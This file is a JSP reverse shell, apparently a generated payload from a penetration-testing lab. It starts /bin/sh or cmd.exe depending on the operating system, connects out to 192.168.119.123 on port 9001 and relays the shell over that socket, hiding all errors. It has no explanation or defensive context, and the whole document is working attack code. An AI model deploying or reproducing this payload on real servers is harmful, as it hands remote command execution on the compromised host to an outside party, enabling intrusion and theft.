<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream wb;
    OutputStream vZ;

    StreamConnector( InputStream wb, OutputStream vZ )
    {
      this.wb = wb;
      this.vZ = vZ;
    }

    public void run()
    {
      BufferedReader sD  = null;
      BufferedWriter bZt = null;
      try
      {
        sD  = new BufferedReader( new InputStreamReader( this.wb ) );
        bZt = new BufferedWriter( new OutputStreamWriter( this.vZ ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = sD.read( buffer, 0, buffer.length ) ) > 0 )
        {
          bZt.write( buffer, 0, length );
          bZt.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( sD != null )
          sD.close();
        if( bZt != null )
          bZt.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.123", 9001 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
